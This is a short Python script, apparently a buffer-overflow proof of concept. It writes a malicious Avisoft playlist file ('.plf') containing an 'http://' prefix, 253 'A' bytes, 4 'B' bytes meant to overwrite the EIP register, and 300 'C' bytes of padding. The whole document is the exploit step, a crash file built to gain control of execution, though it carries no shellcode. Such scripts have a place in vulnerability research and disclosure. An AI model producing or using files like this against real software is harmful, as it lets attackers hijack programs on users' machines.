#!/usr/bin/python

file = open("avisoft_eip_b_crash.plf","wb")

buffer = "http://"
buffer += "A"*253
buffer += "B"*4
buffer += "C"*300

file.write(buffer)

file.close()
